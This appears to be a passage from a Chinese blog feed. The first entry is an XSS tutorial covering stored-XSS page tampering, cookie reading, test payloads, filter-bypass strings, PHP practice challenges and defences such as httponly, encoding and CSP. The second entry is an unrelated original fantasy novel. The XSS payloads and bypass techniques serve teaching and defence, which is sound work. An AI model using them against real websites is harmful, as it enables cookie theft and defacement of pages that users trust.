利用xss篡改网页前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。实例：修改网站所有连接地址本地编写一个test.js脚本，内容如下：将以下语句插入存在存储型xss漏洞的网站1&lt;script type='text/javascript' src='http://localhost/cspt/XSS/test.js'&gt;&lt;/script&gt; 可以发现存在该漏洞的网页上所有的链接都变成了www.google.com。 注：javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以） 利用xss获取用户信息 xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。 alert(navigator.userAgent);读取userAgent内容 alert(document.cookie);读取用户cookie内容 利用java环境，调用java Applet的接口获取客户端本地IP 注：利用Xss漏洞能做的事有很多，前面已经列举了一些，这里便不对每一个都展开讲解，如需了解更多的xss漏洞内容，最好的方式还是看书。 Xss漏洞探测前面介绍了一些xss漏洞的基础内容，那么如何去检测一个网站（某个点）是否存在xss漏洞呢？ xss探针我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。1'';!--"&lt;XSS&gt;=&amp;&#123;()&#125; xss探针可检测出网站有没有对xss漏洞做最基础的防御。 基础xss语句除了xss探针以外，我们也可以输入最简单的测试语句：1&lt;script&gt;alert(/xss/)&lt;/script&gt; 如果插入的语句被原封不动的呈现在了浏览器中，那么说明了2个问题： 代码没有被过滤，说明存在xss 代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。 如果发现某些参数被过滤了，那么尝试使用其他方式（详细介绍在绕过一节会讲）。 xss检测常用语句列举一些常用的xss漏洞检测代码：12345678&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;script&gt;alert(/xss/)//&lt;script&gt;alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;//用分号，也可以分号+空格（回车一起使用）&lt;img src=1 onmouseover=alert(1)&gt;&lt;a herf=1 onload=alert(1)&gt;nmask&lt;/a&gt;&lt;script&gt;window.a==1?1:prompt(a=1)&lt;/script&gt;&lt;script&gt;a=prompt;a(1)&lt;/script&gt;&lt;img src=0 onerror=confirm('1')&gt; Xss防御 如何利用xss漏洞实施攻击并不是身为安全工程师的重点，xss防御才是我们努力要去做的。以下列举几种常见的xss防御方式，个人认为也是非常有效的方式。 可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie） xss filter（检查输入，设置白名单方式） 输出检查（编码，转义，常用编码：html编码，js编码，16进制等) 针对不同位置的输出，使用不同的处理方式 处理富文本 header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略） 设置httponly httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。 xss filter Xss filter往往是一个文本文件，里面包含了允许被用户输入提交的字符（也有些是包含不允许用户提交的字符）。它检测的点在于用户输入的时候，xss filter分为白名单与黑名单，推荐使用白名单，但即使使用白名单还是无法完全杜绝xss问题，并且使用不当可能会带来很高的误报率。 编码转义 编码方式有很多，比如html编码、url编码、16进制编码、javascript编码等。在处理用户输入时，除了用xss filter的方式过滤一些敏感字符外，还需要配合编码，将一些敏感字符通过编码的方式改变原来的样子，从而不能被浏览器当成js代码执行。 处理富文本 有些网页编辑器允许用户提交一些自定义的html代码，称之为”富文本”。想要在富文本处防御xss漏洞，最简单有效的方式就是控制用户能使用的标签，限制为只能使用a、div等安全的标签。 处理所有输出类型的xss漏洞 xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义。 HTML标签中输出即用户输入的内容直接在标签中显示:1&lt;div&gt;$input&lt;/div&gt; 防御方式，将用户输入进行html编码。 HTML属性中输出即用户输入的内容出现在标签的某个属性中：1&lt;div name="$input"&gt;&lt;/div&gt; 防御方式，将用户输入进行html编码。 Script标签中输出即用户输入的内容出现在script标签里面：123&lt;script&gt;var a="$input"; // $input=";alert(/xss/);//"; 则会产生xss漏洞&lt;/script&gt; 防御方式，将用户输入进行javascript编码。 在事件中输出即在事件标签中输出用户输出的内容，比如onclick标签等。防御方式，将用户输入进行javascript编码。 在CSS中输出即用户输入的内容出现在了css的style等标签中。防御方式，进行十六进制编码。 在地址中输出这个跟在html属性中输出类似，即在a标签的href属性中输出。防御方式，将用户输入进行url编码。 总结：总得来说防御xss的方式只是三种：httponly、过滤字符、转义字符。然而使用何种编码转义，什么地方需要做转义才是真正防御xss漏洞的难点及重点，如果能搞明白并解决这个问题，那么xss漏洞将会无处可寻。————《白帽子将web安全》一书xss篇读后感。 Xss绕过技巧 有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。作为一名安全工程师，了解如何绕过xss防御可以更好地解决xss防御问题。（这里探讨的绕过xss防御不包含绕过waf的部分） 绕过xss filter绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。前提一：如果过滤了”《script》”字符串,但没有过滤”&lt;”、”&gt;”字符，则可以使用javascript:[code]伪协议的形式。1&lt;img src="javascript:alert('test');"&gt; 前提二：过滤了《script》，且只过滤一次。1&lt;scr&lt;script&gt;ipt&gt; 前提三：没有正确处理空格、回车等字符123&lt;img src="javasCript:Alert(/xss/)" width=100&gt; 关于绕过xss filter的方式还有很多，这里不一一展开了，只是列举下常见的方法： 转换大小写 大小写混写 双引号改单引号 引号改为/ 用全角字符 使用javascript伪协议 使用回车、空格等特殊字符 在css的style中使用/**/注释符 使用字符编码 利用事件触发xss Xss闯关实操 为了加深对xss漏洞的理解，我特意用php编写了一套xss闯关练习平台，里面包含了一些常见的xss防御题型，我们需要做的就是如何去绕过这些防御，以及思考这些防御的弱点在于哪里？xss闯关练习平台页面展示：因为时间有限，并没有对页面进行美化，凑合着用用~!~。平台题目由易到难，接下来的实操以及介绍也会从简单到复杂。介绍时，我会分别展示php源码中的防御方式（展示服务端代码），以及如何去绕过这些防御（展示客户端html代码）。 无任何过滤下图是最简单的一个xss练习例子，网页从url中获取参数id的值，直接在页面中显示出来，没有做任何过滤。查看网页源代码：查看php代码：12$id=$_GET['id'];echo '当前提交的参数:'.'&lt;font color=red&gt;'.$id.'&lt;/font&gt;'; 过滤《script》那么一般情况下，网站不可能对用户输入不做任何过滤，比如以下案例：通过观察html代码我们可以看到过滤了《script》以及《/script》，查看下php代码：1234$id=$_GET['id'];$id=preg_replace("/&lt;script&gt;/", "", $id);$id=preg_replace("/&lt;\/script&gt;/", "", $id);echo '提交的参数:'.'&lt;font color=red&gt;'.$id.'&lt;/font&gt;'; 绕过方式： 过滤alert让我们增加点难度，直接看第5题：这回我们输入内容后，网页直接显示报错，而不是返回过滤后的内容，这将会增加我们判断服务端过滤规则的难度。为了方便演示，我这边直接打开php代码查看（实际测试过程肯定是比较漫长的，需要一个个标签去试）12345$id=$_GET['id'];if (preg_match('/alert/i',$id))&#123; echo '出错啦!';&#125;else&#123; echo '提交的参数:'.'&lt;font color=red&gt;'.$id.'&lt;/font&gt;'; 知道了服务端过滤了alert标签后，我们就可以构造绕过方式了:能构造弹框的标签有好几种（当然真实环境应该不会只过滤弹框标签） 结合事件构造xss乍一看第8题并没有什么很好的思路。然后我通过查看html源码，寻找一些蛛丝马迹：在测试几次后，我们发现网页源码中的变化：让我们来看看php代码是怎么写的：1234&lt;form action="&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;" method='post'&gt;YOUR CODE:&lt;input type='text' name='code'/&gt; &lt;input type='submit' name='submit'/&gt;&lt;/form&gt; 可以看到php代码实现了将网页自身的url输出到form的action属性中。构造xss：查看下html源码1&lt;form action="/XSS/xss_8.php /" onsubmit='alert(1)' name="" method='post'&gt; 然后点击按钮，执行了onsubmit事件。 总结：关于xss的案例还有很多，由于篇幅的关系，这里不一一演示了。xss练习平台只是列举了最基础且常见的xss漏洞情况，实例后期可以再进行增加，而关键点在于通过实操可以让我们深刻理解xss发生的位置，以及如何更好地去防御它。 Xss平台xss漏洞的利用离不开一个强大的xss平台，关于xss平台的搭建与使用，请移步：xss平台搭建小记 说明：本文将会持续更新一些xss绕过以及防御姿势，目前本文对绕过以及防御姿势的描述有限，一是由于本人对xss漏洞理解不够深入，二是由于缺乏测试案例。但随着学习的深入，相信会记录更多更好的干货，尽情期待哦。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>跨站脚本攻击</tag>
        <tag>xss漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【原创小说】北岛流年]]></title>
    <url>../../../../../../../../2017/05/26/1/</url>
    <content type="text"><![CDATA[左手华灯初上，右手星点余光 废话不多说，扒几篇躺在QQ空间的原创小说，应该是3、4年前写的东西。回想当年还是一个意气风发的少年，遥想当年羽扇纶巾，谈笑间…..扯远了。回归正题，开博至今都是在分享一些技术内容，是时候调调味了，因此我在博客中新增了一个分类：诗意年华，专门用来分享一些本人原创的小说或者诗歌，也算是对以往生活的一个祭奠。 楔子北国狼烟四起，战火纷飞，黎民饥离苦散，北岛城生灵涂炭。连年的天灾，使得北岛国力衰微，各方三国随即联合来袭，此时的北岛虽是四国之首，但天灾人祸使它无力反抗，只能坐以待毙。 三国联盟已是兵临城下，眼看就要破城而入，到那时城内几十万百姓都将难逃厄运。霎时，天空乌云密布，北岛城门缓缓开启，战神将军挥师迎敌，纵然将军身为北岛国的战神，但敌众我寡的劣势仍无法改变。 战神将军带领着北岛国的士兵拼到了最后，到最后一刻他仍用双手紧紧的按住城门，直至在金戈铁马滚滚沙场中化为一尘、一埃。 城门破了，天地浩劫如数应验，杀戮一直蔓延到天明，血流成河…… 祭神节有没有一个人可以爱你不变，即使飞速流年 百年之后的北岛城已是生机勃勃，一片盎然之色。时间冲刷了战乱的痛苦，流年往往使回忆成尘埃。然而，北岛城城门口竖立着当年浴血奋战的战神将军像，虽说将军未能保护北岛国，但北岛的百姓仍无比的敬重他，为他设立祠堂，并告诫子孙世世代代供奉这位伟大的将军。 每年冬季举行祭神节，就是为了纪念他，百姓往往会烧香祈祷北岛国泰民安、风调雨顺。这年冬季，又到了祭拜战神将军之时，北岛百姓陆陆续续汇成滚滚人群准备上山参加祭祀，场面好不热闹。 清晨的阳光慵懒地照进窗户，落定在了秦铭熟睡的身子。 “秦铭，准备好了吗?祭祀大典要开始了”福记当铺的秦三叫唤着他儿子上山参加祭祀。 祭祀大典非常庄严隆重，未成年时是不能参加的，因此每年正值成年的青年就会上山祈祷战神将军，希望自己以后也能像当年的战神将军战场杀敌，为国立业。 “哦，来了，来…了…再睡会儿。”秦铭今年正值成年，以往都没有参加过祭祀大典，对此毫无兴趣，相比之下他更爱舒适的大床。 秦三忙忙活活的打理好衣裳，冲进秦铭的房间，看着正洋洋大睡的他，怒火横生，一把掀翻了他的木床，只听一声巨响，秦铭迷迷糊糊的从睡梦中醒来。 “爹，呵呵！你脸色怎么这么难看啊，刚才怎么了，是不是敌军攻城，把我床都弄翻了”秦铭一脸疑惑地望着秦三，秦三更是一肚子的火，“现在都什么时候了，还睡！什么攻城，是我把你床掀翻的。今天对你来说是很重要的日子，不能耽搁，你就别折腾我这把老骨头了。诶，我迟早被你气死！”秦三气得一屁股坐在了地上，重重的咳了几声，他的身体是越来越差了。 秦铭见父亲动真格了，就赶紧穿好衣裳，转身笑着说道：“爹，我好了，走吧！”秦三看着他傻头傻脑的样子，真是哭笑不得，他单手撑地，艰难地从地上爬起，拍了拍屁股上的灰尘,指了指床前的一叠衣服，说道：“祭祀大典是不能穿便衣的，呐！我昨晚已经把衣服理好放那了，快点穿，兴许还来的及”。 那是秦铭母亲临死前缝制的，原本还想看着他成年，可天不随人愿，她在秦铭还很小的时侯就过世了，因此秦铭对她已没什么印象。 秦三慢慢地走出房间，回想起秦铭儿时的情形,时光飞速。儿时的秦铭就调皮好胜，一旦跟人争强便一定要拼个你死我活。他常常带领着一帮小孩去攻打另一伙比自己年纪都大的孩子，每次弄得衣裳破损满脸污垢回家，秦三见后又是一顿毒打，但他从没为此掉过一滴眼泪，也不喊疼，只是在心里默默的暗下决心，准备再战，为自己报仇雪恨。 那时，秦三仿佛在自己儿子身上看见了竖立在城门口战神将军的影子，所以他辛辛苦苦地栽培秦铭，希望有朝一日他能像将军一样上场杀敌，保卫北岛的黎民，这样他的余生也能幸福了。 秦三静静地站立在屋檐下，看着缕缕蛛丝，青苔上瓦，不免感叹岁月如梭，时光荏苒。 此时，秦铭已换好了装，缓缓地走向秦三，他不想打扰他的思绪，望着他轻声说道：“爹，放心吧，我会依照娘的遗愿，做个顶天立地的男子汉，为国奋斗”。 秦铭知道他是想母亲了，每次想她时秦三总会看着屋檐，看着天，静静的发呆。 “秦铭呐，爹也希望你能成材。诶，什么都不用说了，快走吧！”秦三定了定神说道。 秦三父子箭步往山上奔去，幸得上天眷顾，让他们赶上了滚滚的祭祀人群。 “哇，好多人啊！爹，你快看。”秦铭指着人群惊呼道，首次参加祭奠，他还从没见过这么多人。 “这么点人就大惊小怪的，以后还怎么上战场，那时面对的可是千军万马。”秦三看着稚气未脱的秦铭，双宇间横生几分忧虑。 上山的路没有想象中的崎岖，只是无际的漫长，对秦三来说，已是万分艰难。年迈的秦三时不时地在路边落脚，大口大口地喘气。他看着秦铭吃力地说：“铭儿啊！看来爹是真的老了，不中用了。”看着苍老的父亲，秦铭的眼眶开始湿润，说道：“爹，你放心，待会我一定祈求战神，保佑你长命百岁”，没等他说完，秦三就用手重重地打向他的脑袋。“诶呀，爹，你干嘛呀？”秦铭叫喊着，秦三喘了口气说道：“你这个不孝子，待会去，你要虔诚地祈求战神，希望他能保佑你早日上阵杀敌，为国立业，知道吗？”。望着虚弱的秦三，秦铭强忍着眼泪说道：“可是，爹，你的身体……”。秦三抚摸着秦铭的脸，语重心长地说：“秦铭啊，爹不要什么长命百岁，爹只要你能像战神将军那样，为国立业，光中耀祖啊！只有这样，爹才能……才能对得起你死去的娘亲，才能安心的度过晚年。”秦三轻拍着胸脯大口地喘气，秦铭连忙上前搀扶起他，轻身说道：“爹，你放心吧，我不会让你失望的。”随即，两人跌跌撞撞地往山顶赶去。 天空渐渐转阴，不远处浓厚的黑云隔绝了蓝天，大风即将而至。 祭祀女神有没有一段情可以难诉思念，纵然轮回百遍 战神祠堂建在紫铭山顶，由皇族紫衣人看守，任何凡人都无法靠近，只有在祭神节对百姓开放，供百姓敬奉。 紫衣族是北岛国最尊贵的种族，据说是人皇伏羲的后代，也是最为神秘的种族。 偌大的祭祀人群到达了紫铭山顶，山顶是一片空地，空地正中央矗立着一尊战神像，与城门口的一样，但几乎是放大了好几百倍。秦铭走到战神像旁死死地看着他，从下往上一直把头抬到脑后都望不见顶端，巨大的神像延伸到了天际，直插云霄，场面着实令他震撼。在神像背后的是壮丽的祭祀台，散发着绚丽的光芒。 秦三瞅了瞅呆若木鸡的秦铭说道：“小子，你还真没见过世面。据先人讲，这座神像动用了几乎全城的青壮年，历时几十年建成，并且经过圣母的通天之术，非常有灵气，能保佑我们北岛的百姓远离灾难”秦铭听得津津有味。 突然间，狂风大作，随风而至的大雾使得神像的身后一片雾洋。不多时，只见几十位身着紫衣的少女从神像的身后走出，身影渐渐清晰，浑身散发着淡淡的清香。 “女神降临，众人还不下跪”领头的紫衣女子看了看众人，随即发号施令。听到号令的百姓纷纷屈膝跪拜，双手紧贴着地面，高声齐呼：“女神千秋万载，永生不灭！”。丝毫不知状况的秦铭被秦三强拉着手臂，急急忙忙地跪地呼喊。百姓们虔诚地跪拜，身体不敢有丝毫动弹，他们无不低着头紧闭着双眼。然而，好奇的秦铭全然不知礼法，微微抬起头看着祭祀台上的一切。只见一位半边脸上蒙着轻丝面纱,身着紫金缕衣柳叶眉瓜子脸的年轻少女走上祭祀台。秦铭看着眼前的少女，有一种似曾相识的感觉。 “爹，她是谁啊，长的蛮漂亮的，比我们村里的那些千金小姐好太多了”秦铭捂嘴偷笑着，秦三贴住他的耳朵轻声的说，“那就是祭祀女神，哪能跟我们这些凡夫俗子比。”秦铭听后揉了揉眼睛，定睛望着女神。 “女神，洛瑶”秦铭口中不禁念叨着，不知怎么的，看着祭祀女神他眼角流出了泪水。 突然间，狂风大作，尘埃四起，祭祀台一片混沌，迷茫了一切。 “洛瑶，洛瑶！”不远处依稀传来呐喊，撕心裂肺。风停云定后，出现在秦铭眼前的不再是黎民百姓，而是一位妙龄的少女，她眼中流露的是无限的悲伤，少女哀求着她身边一位身披铠甲的将军，她跪着拉住将军的裤脚。 “将军，求求你带着这一城的百姓走吧，天地浩劫无法避免，这不是你我之力能够阻止的”少女似乎已经流干了泪水，用尽最后一丝余力哀求着将军，秦铭看着眼前的一切，忽感胸口一丝剧痛，他用手捏住自己的胸口，似乎听到了心碎的声音，顿时泪水浸没了眼眶。 紫铭山顶上，秦三抱着昏迷不醒的秦铭，嚎啕大哭痛苦不已，秦铭不知怎么的，看了女神一眼后就昏倒在秦三的怀里，任凭他怎么叫唤都没反应。 此时，几个紫衣女子从祭祀台上一飞而下，几缕丝带轻飘在空中，紫衣女子踏着丝带跃到了秦三面前。 “大胆刁民，竟敢在祭祀大典大呼小叫”紫衣女子说着口中念起了咒语，瞬间，几缕丝带仿佛一把把利剑，狠狠的插向秦三，悲痛中的秦三更是措手不及，眼看利剑已经逼近他。 突然，无数的彩蝶出现在秦三面前，为他挡住利剑的攻击。紫衣女子见眼前情景，连忙收手。正当秦三疑惑谁救了他时，面前的彩蝶像是接受了命令似地，往紫衣女子身后飞去。 一片迷雾之后一个模糊的身影渐渐靠近、清晰，秦三看着怀中的秦铭，心中忐忑不已。迷雾中，一位散发着紫光白发苍苍的妇老出现在秦三眼前，秦三紧紧地抱着怀中的秦铭，他容不得他受半点伤害，面对眼前救了自己的奇异妇老，他心中满是惊慌恐惧。 紫衣女子们纷纷前去搀扶着老妇，“见了圣母，还不下跪！”领头的紫衣女子对着秦三叫喊，“诶，紫风！不知者无罪”，圣母缓缓的走近秦三，“这位是令公子吗，我看他是中了摄魂之术，恐怕这辈子是醒不来了”，圣母说着转身向祭祀台望去，祭祀女神此时正站在那儿注视着这一切，她的身体似乎颤抖着，苍白的脸上写尽伤感。 “摄魂术！我这一世与人并无过结，到底是谁痛下杀手，让我们秦家无后啊！”秦三伤心地流着泪，紧紧地抱着怀中的秦铭。 “这一切都是命啊！这并不是你的错，而是他自己啊，自己前世种的孽，只有在今生还了”圣母说着摇了摇头，“紫风，把他带到紫金神殿，如果上苍能够原谅他们当年犯下的错，也许还有的救，诶，孽债啊！”。 紫风用丝带将昏厥的秦铭从秦三怀里驼浮到空中，随着圣母一起消失在迷雾深处。 此时，心灰意冷的秦三看着远去的秦铭，内心撕心裂肺的痛。他别无选择，只能让秦铭跟随着圣母远去，至少那样他还有机会活着，即使这辈子自己再也见不到他，他也心满意足了，也能给在天堂的妻子一个交代了，只是他不知道，没了秦铭，他活着还有什么意义，还有什么意义…… 秦铭摇摇晃晃地站起身子，准备转身回家，正在此时，一把利剑刺入秦三的后背，直穿胸膛。秦三嘴角喷涌出鲜血，望着胸前沾满鲜血的利剑，他眼角流出了泪水，苍老的身躯再也支撑不住，随着背后的阵阵寒风倒地而亡。踏着秦三倒下的身躯，传来一阵冷笑。 “主人，为何要杀他？”。 “他已经没有利用价值了。你赶紧回去，把这份血书带给秦铭，切记小心行事。” “是，主人”。 百年实在太久太长，也许足以让人彻底地忘记仇恨，却无法使人忘记彼此深爱着的那个人。顿时风起云涌，尘埃四起，一声长啸，渐渐地消失在迷雾深处…… 天地浩劫当泛着银光永无止尽的雪，融化在你的心间 北岛城的冬天似乎来得特别早，六月飞雪在这已是常事。犹如柳絮般的白雪缓缓地从天而下，不多时北岛城便是一片银白色。 秦铭站在一片白色之上，望着漫无边际的雪地，他无助的奔跑着。冰冷的雪花飘落在他身上，瞬间染白了外衣。突然他失落地跪倒在地，似乎丢失了什么，他把手轻轻地放在胸口，然后对天长啸，“为什么，呵…呵…”，他丢的是心。 寒风在秦铭耳旁呼啸，更像是命运对他的作弄，远处依稀传来几许惆怅，敲打着秦铭的记忆。秦铭起身向远处望去，两个黑影出现在白色迷茫中，身影折射出彼此相爱的痕迹。 “洛瑶，是你吗？洛瑶！”秦铭用尽全身力气叫喊着，但无论他怎么呼唤，答复他的只有无情的寒风呼啸。身影越来越远，秦铭痛苦的追随着，他深怕她会消失不见，他一个人已经太久太久了。雪下得越来越大，似乎淹没了一切，秦铭仍然跌跌撞撞地跑着，他还记得说过要牵着她的手，带她一起走，即使走到天涯海角。这一切他还清楚的记得，可她已经忘了，洛瑶！ 秦铭静静地躺在玄月石上，口中不停地呼喊着，汗水湿透了他的衣服。紫金神殿内，四神兽正在为秦铭疗伤，可任凭他们怎么尽力，昏迷的秦铭仍然紧闭着双眼，只是已经流干了泪。 “洛瑶，洛瑶！不要走，不要……”昏迷的秦铭冒着冷汗，身体不停地颤抖着。 “圣母，他恐怕不行了！”紫风对着圣母说道。 “怎么会这样，诶！看来一切都是天意啊，我也无能为力了”圣母无力地摇着头。 四神兽之首青龙无奈地说道：“诶！他并非凡人，看来解铃还需系铃人啊！”。紫风走向前去，疑惑地问道：“系铃人，会是谁呢？”。 青龙看着犹如死人般的秦铭答道：“昏迷是一个人情感最脆弱的时候，当然也是情感最为流露的时候，他在昏迷时一直叫着洛瑶，以我看洛瑶女神应当是他的系铃人”说完四神兽便化为四道金光，消失在紫金神殿。 紫风走到圣母面前说道：“圣母，既然女神是他的系铃人，那……”。圣母猝然打断紫风的话，“不行，秦铭中的摄魂术就是她下的，怎么能让她再来加害他呢！”。 紫风不敢相信地问道：“怎么会这样？既然女神是他的系铃人，又为什么要加害他呢？不，不会的”。 圣母微微的抬头，转向殿外的灰色天空，往事一一浮现…… 这要从百年前的天地浩劫说起。那场北岛国的浩劫，我至今还清楚地记得，满城的鲜血，黎民痛苦的哀鸣，如今想起还心有余悸。然而这场浩劫并非天灾，而是我们北岛国古老的族规所致。 千年前，北岛还处于蛮荒，我们紫衣族人来到这里，带来了文明，带来了繁华。从此北岛国逐渐繁盛，一些临近国家的百姓纷纷迁到北岛，几十年间北岛的人口增长了几十倍。然而这也带来了麻烦，如此众多的百姓，我们开始无力管治。为此紫衣先人开创了一系列的管理制度，选出出众的紫衣族人担任圣母，再由圣母推选女神，并从百姓中选出武艺最高者，封为战神。三者是北岛的灵魂，为了北岛的长盛，紫衣族人制定了族规，女神与战神不能恋爱，若是违反了族规，北岛将会遭致天地浩劫。 千年间，我们都安循着族规，直到百年前，新任北岛国的战神，他不顾族规与现任女神洛瑶坠入爱河。天地浩劫如约而至，北岛的繁华瞬间转为残骸，生灵涂炭。 眼看北岛就要灭亡，上苍怜悯北岛的百姓，决定给北岛一次赎罪的机会。战神将军必须要用鲜血洗去他的罪过，而女神则要饮下情恨水，使她对所爱之人有的只是仇恨。 为了北岛的百姓，战神将军战死沙场，洛瑶得知后含泪饮下了情恨水，从此她对战神只有恨。然而，我万万没有想到，百年时间不但没有使她的恨消散，反而无限地增加了她内心的仇恨，现如今竟对他痛下杀手”。 紫风定了定惊说：“圣母的意思是秦铭就是当年的战神将军？”圣母缓缓地点头，“从他在昏迷中一直呼喊着洛瑶这一点看，他应当与洛瑶有着千丝万缕的关系，洛瑶的痛下杀手，更让我坚信他就是战神”。 紫风缓缓地点了点头，“世上也只有女神懂得摄魂术，如若不是女神亲自相救，他必死无疑啊!”。 圣母皱了皱眉，苍老的脸上竟显忧虑，她望着昏迷中的秦铭，焦虑地说道：“不，他可能比我们想象的要复杂得多。如果说他是当年的战神，他现在应该已经没命了，因为战神毕竟只是凡人，不是我们紫衣族人，受不了摄魂术。然而，秦铭虽说身受重伤，昏迷不醒，但却依然活着，从这点看他不该是战神。”圣母叹了口气，慢慢地走近秦铭，叹息道：“看来，上天仍然无法原谅你们当年犯下的过错啊！” 话音刚落，只听神殿外传来女神的叫喊。 “让我进去，我要见圣母。”女神洛瑶着急面见圣母，与殿外守卫纠缠着。“这,这不行啊!女神，圣母吩咐过不能让任何人进入”，守卫无奈地说道。 “让她进来吧！”紫风搀扶着圣母走向殿外，女神站在圣母面前，冷冷地望向殿内“让我见他一眼！”。 圣母神情骤时凝聚，双眼放射出刺骨的寒意，“你不会是来看他有没有死吧？”圣母手中的拐杖用力向地一击“哼！中了摄魂术的凡人还能活吗？”。 女神不为所动，“不，他还没死，他也不能死”女神依旧死死地盯着大殿内昏迷的秦铭。弹指一挥间，万物无化，改变的只有女神的眼神，不再那么冷，甚至闪烁着泪光。她柔情的注视着秦铭，“圣母，让我见见他，这世上只有我能救他”。 圣母轻轻地叹了口气“好吧，天意如此，造化弄人！”说着三人缓缓走向殿内。 洛瑶眼中闪烁着泪光，将昏迷中的秦铭扶起。我不会让你死的，不会！洛瑶挥动着双手，身体散发出光芒，她与秦铭对掌运功。一股股气从洛瑶的身体流经秦铭，随之而去的是支离破碎的记忆。 此时， 秦铭的脑海中浮现出熟悉而陌生的片段，仿佛前世的记忆…… 元宵佳节，北岛城的夜空无比绚烂，大街上到处是高挂的红灯笼，原本漆黑的夜空被五彩的烟花浓抹着，拥挤的街市，华灯初上。明月的光辉倒映在城内的渭河中，水面一席涟漪，月光渐渐远离，河面缓缓的驶过一叶扁舟。一位风华绝代的少男站在船头，一手摇晃着纸扇，一手提着灯火，神态泰然。沿途无数的少女为之轻狂，他却只是一笑而过。 渭河上横跨着一座古桥，夜晚的古桥异常的美，水面反射的月光更使之增添了几分色彩。元宵节，北岛的百姓都习惯放水灯笼，将灯笼放入渭河中，让其寄托着自己的希望飘荡。 桥上，洛瑶看着河水中的星点亮光，在绚烂的夜空下翩翩起舞。“紫风，他们过元宵节可真有意思，太好玩了！”她显得很兴奋，“小姐，我们该回去了，不然圣…夫人可要生气了”洛瑶身旁的侍从忧虑的劝说。她自当没听见，解开面纱，在空中挥舞着。 一阵清风，洛瑶的面纱滑出手心，随风摇曳。面纱随风飘落，眼看就要落入河中，不想迎面驶来了一叶扁舟，少男稳稳的接住了面纱。紫风连忙跑向前去，“公子，请归还面纱”，少男定睛看着洛瑶，并未听见紫风所说。船缓缓靠岸，少男走向洛瑶，先是作揖，然后将面纱放在她手中。“谢谢公子！”洛瑶缓缓地抬起头，只见一位眉清目秀的少男注视着自己，连忙低下头，“紫风，我··我们回去吧”她涨红了脸颊。“是，小姐”洛瑶渐渐消失在茫茫人群中，少男仍然站在原地，闻了闻手中残留的香味，露出了微笑，少男手中的灯火随着微风窜动着，散发着青光。 玄月石上，秦铭依旧昏迷不醒，额头不停地冒汗，洛瑶继续运气，圣母则坐在一旁焦虑不安。 残碎的记忆勾勒出逝去的光景…… 蓝天中随风舞动的风筝悠闲的翱翔，青草地上人们追逐着。秦铭拉着长线一直蔓延到天边，洛瑶犹如彩蝶般地追随。“秦铭，等等我，等等我！”洛瑶追赶着他，秦铭转过头“你来追我啊，我可要一直跑着，让你追我到天涯海角。”洛瑶停了下来，喘了口气，“好啊，你等着！”，说罢便起身追赶。 玄月石上，秦铭渐渐恢复了意识。他慢慢地睁开双眼，视线渐渐清晰。圣母走近秦铭说道：“你终于醒了，你一直昏迷，已有半个月了”。秦铭用手按了按头，“诶，真痛！我这是在哪啊？我记得在山顶突然感觉眼前一片迷茫，然后就没了意识。对了，我爹呢？”秦铭满是疑惑。 圣母望着满脸狐疑的秦铭，从胸中拿出一封血书，递给秦铭说道：“这是你爹遗留给你的。”秦铭双眼充满血丝，死死地盯着血书，颤抖着身子说道：“你的意思是说我爹他……他死了。”圣母满是愧疚，紧皱着眉说道：“是的，他自杀了”秦铭眼角闪现着泪花，他双手捂住自己的耳朵，疯狂地摇晃着头，神情恍惚地说道：“不，不会的，他不会丢下我的。”秦铭跌跌撞撞地爬下玄月石，大伤处愈地他，脚下一软，狠狠地摔倒在地，他抬起头哭喊道：“这一切到底是怎么回事啊？”。圣母搀扶起虚弱的秦铭，无奈地摇晃着头说道：“你还是先看看血书吧，看完你会明白一切的。” 紫金神殿的天空布满了灰色，湿润的尘埃在黑暗的云层中酝酿，大雨即将来临。 血书当用九盏红烛照亮天明的黑夜，烟花幻化作缠绵 紫金神殿内，秦铭颤抖着打开老旧的血书，里面包裹着一枚精致的玉佩，底下是一封遗书。 秦铭，当你看到这一切时，想必爹已不在人世了。不要难过，孩子！这一切都是命中注定的。老实说，我还要感谢你给予我的这20年时光，能成为你爹我很开心。原谅爹的自私好吗？爹的任务完成了，该休息了，往后的日子你一定要坚强。 20年前的冬季，雪下得特别大，我跟你娘正在屋里生火做饭，突然从屋外传来一阵孩子的哭啼。我们赶紧跑去开门，只见屋外厚厚的雪地上依稀放着一个襁褓，里面正是刚满月的婴儿，我们抱起他，心想他是上天赐予我们秦家的。紧接着，我们在襁褓中发现了一封血书，里面记载了你的身世。 也就是在那一年，你娘染上了怪病，我们寻访了无数的名医，都毫无作用。眼看你娘的病越来越重，突然有一天来了位自称紫衣仙人的神医，他自称能救你娘，但…但…但必须在月圆之夜，用九盏红烛的微光，结合元婴之气，做成药引服下，方能救活你娘。可这元婴，我们上哪去找啊？ 于是，我们想起了那封血书，原来你前世正是掌管天庭九灯的灯神，因私自下凡而被贬为凡人。你修行万年，一朝成仙，然而却一念成灰。茫茫雪季，你降临了凡间，幻化成元婴，也许你是上天派来解救你娘的。 